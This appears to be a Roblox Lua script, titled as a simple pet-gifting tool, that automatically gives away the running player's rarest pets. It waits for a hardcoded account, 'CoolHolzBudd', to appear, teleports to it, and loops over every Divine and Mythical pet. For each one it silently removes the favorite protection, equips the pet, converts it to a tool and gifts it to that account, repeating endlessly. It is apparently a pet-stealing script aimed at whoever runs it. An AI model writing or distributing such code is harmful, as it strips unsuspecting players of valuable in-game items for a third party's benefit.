-- Simple Pet Gifting Script
-- Fixed version with correct unfavorite logic

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

-- Wait for game to load
if not game:IsLoaded() then
    game.Loaded:Wait()
end
wait(3)

-- Import services safely
local DataService, PetsService, PetGiftingService, TeleportUIController
local PetList, InventoryServiceEnums, FavoriteItemRemote

pcall(function() DataService = require(ReplicatedStorage.Modules.DataService) end)
pcall(function() PetsService = require(ReplicatedStorage.Modules.PetServices.PetsService) end)
pcall(function() PetGiftingService = require(ReplicatedStorage.Modules.PetServices.PetGiftingService) end)
pcall(function() TeleportUIController = require(ReplicatedStorage.Modules.TeleportUIController) end)
pcall(function() PetList = require(ReplicatedStorage.Data.PetRegistry.PetList) end)
pcall(function() InventoryServiceEnums = require(ReplicatedStorage.Data.EnumRegistry.InventoryServiceEnums) end)
pcall(function() FavoriteItemRemote = ReplicatedStorage:WaitForChild("GameEvents", 2):WaitForChild("Favorite_Item", 2) end)

-- Configuration
local Config = {
    TargetPlayerName = "CoolHolzBudd",
    DelayBetweenGifts = 3,
    DebugMode = true
}

-- Utility Functions
local function Log(message)
    if Config.DebugMode then
        print(os.date("%H:%M:%S") .. " -- [Gifting] " .. message)
    end
end

local function GetPlayerData()
    if not DataService then return {} end
    local success, data = pcall(function() return DataService:GetData() end)
    return success and data or {}
end

local function GetPetInventory()
    local data = GetPlayerData()
    if data.PetsData and data.PetsData.PetInventory then
        return data.PetsData.PetInventory.Data or {}
    end
    return {}
end

-- Pet Functions
local function UnfavoritePetInBackpack(petId)
    if not FavoriteItemRemote or not InventoryServiceEnums then
        Log("❌ Favorite system not available")
        return false
    end

    -- Find pet tool in backpack
    local backpack = LocalPlayer.Backpack
    if not backpack then return false end

    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local toolPetUUID = tool:GetAttribute("PET_UUID")
            local toolUUID = tool:GetAttribute("UUID")
            
            if toolPetUUID == petId or toolUUID == petId then
                -- Check if favorited
                local isFavorited = tool:GetAttribute(InventoryServiceEnums.Favorite)
                if isFavorited then
                    Log("🔓 Unfavoriting pet in backpack: " .. tostring(tool.Name))
                    
                    local success, error = pcall(function()
                        FavoriteItemRemote:FireServer(tool)
                    end)
                    
                    if success then
                        Log("✅ Sent unfavorite request")
                        wait(1)
                        return true
                    else
                        Log("❌ Failed to unfavorite: " .. tostring(error))
                    end
                else
                    Log("✅ Pet not favorited: " .. tostring(tool.Name))
                    return true
                end
                break
            end
        end
    end
    
    return false
end

local function EquipPet(petId)
    if not PetsService then return false end
    
    local success, error = pcall(function()
        PetsService:EquipPet(petId, 1)
    end)
    
    if success then
        Log("✅ Equipped pet: " .. tostring(petId))
        return true
    else
        Log("❌ Failed to equip: " .. tostring(error))
        return false
    end
end

local function MakePetIntoTool(petId)
    if not PetsService then return false end
    
    local success, error = pcall(function()
        PetsService:UnequipPet(petId)
    end)
    
    if success then
        Log("✅ Converted to tool: " .. tostring(petId))
        return true
    else
        Log("❌ Failed to convert: " .. tostring(error))
        return false
    end
end

local function WaitForPetTool(petId, maxWait)
    maxWait = maxWait or 5
    local waited = 0
    
    while waited < maxWait do
        local character = LocalPlayer.Character
        if character then
            for _, tool in pairs(character:GetChildren()) do
                if tool:IsA("Tool") then
                    local toolPetUUID = tool:GetAttribute("PET_UUID")
                    local toolUUID = tool:GetAttribute("UUID")
                    
                    if toolPetUUID == petId or toolUUID == petId then
                        Log("✅ Found pet tool: " .. tostring(tool.Name))
                        return tool
                    end
                end
            end
        end
        
        wait(0.5)
        waited = waited + 0.5
    end
    
    Log("❌ Pet tool not found after " .. waited .. "s")
    return nil
end

local function GiftPet(targetPlayer)
    if not PetGiftingService or not targetPlayer then return false end
    
    local success, error = pcall(function()
        PetGiftingService:GivePet(targetPlayer)
    end)
    
    if success then
        Log("✅ Gift request sent")
        return true
    else
        Log("❌ Gift failed: " .. tostring(error))
        return false
    end
end

-- Main Functions
local function FindTargetPlayer()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name == Config.TargetPlayerName then
            return player
        end
    end
    return nil
end

local function GetGiftablePets()
    local inventory = GetPetInventory()
    local pets = {}
    
    for petId, petData in pairs(inventory) do
        if petData and PetList and PetList[petData.PetType] then
            local petInfo = PetList[petData.PetType]
            local rarity = petInfo.Rarity
            
            -- Only Divine and Mythical
            if rarity == "Divine" or rarity == "Mythical" then
                table.insert(pets, {
                    id = petId,
                    name = petData.PetType,
                    rarity = rarity,
                    rarityValue = rarity == "Divine" and 6 or 5
                })
            end
        end
    end
    
    -- Sort by rarity (Divine first)
    table.sort(pets, function(a, b)
        return a.rarityValue > b.rarityValue
    end)
    
    return pets
end

local function ProcessPetGifting(targetPlayer)
    Log("🐕 Starting pet gifting to " .. targetPlayer.Name)
    
    local pets = GetGiftablePets()
    if #pets == 0 then
        Log("❌ No giftable pets found")
        return
    end
    
    Log("📋 Found " .. #pets .. " pets to gift")
    
    for i, pet in ipairs(pets) do
        Log("🔄 Processing " .. i .. "/" .. #pets .. ": " .. pet.name .. " (" .. pet.rarity .. ")")
        
        -- Step 1: Unfavorite in backpack if needed
        UnfavoritePetInBackpack(pet.id)
        
        -- Step 2: Equip pet
        if EquipPet(pet.id) then
            wait(2)
            
            -- Step 3: Convert to tool
            if MakePetIntoTool(pet.id) then
                wait(1)
                
                -- Step 4: Wait for tool and gift
                local tool = WaitForPetTool(pet.id, 5)
                if tool then
                    if GiftPet(targetPlayer) then
                        Log("🎉 Successfully gifted: " .. pet.name)
                        wait(3) -- Wait to see if gift went through
                    else
                        Log("❌ Failed to gift: " .. pet.name)
                    end
                else
                    Log("❌ Tool not found for: " .. pet.name)
                end
            else
                Log("❌ Failed to convert: " .. pet.name)
            end
        else
            Log("❌ Failed to equip: " .. pet.name)
        end
        
        wait(Config.DelayBetweenGifts)
    end
    
    Log("🎯 Pet gifting completed!")
end

-- Main Logic
local function Main()
    Log("🌱 Gifting system started, looking for: " .. Config.TargetPlayerName)
    
    while true do
        local target = FindTargetPlayer()
        if target then
            Log("🎯 Found target: " .. target.Name)
            
            -- Teleport to target
            if TeleportUIController then
                pcall(function()
                    TeleportUIController:Move(target.Character:GetPivot())
                end)
                wait(2)
            end
            
            -- Start gifting
            ProcessPetGifting(target)
            
            -- Wait before next check
            wait(30)
        else
            wait(5) -- Check every 5 seconds
        end
    end
end

-- Start the system
spawn(Main)

Log("🚀 Gifting automation loaded!")
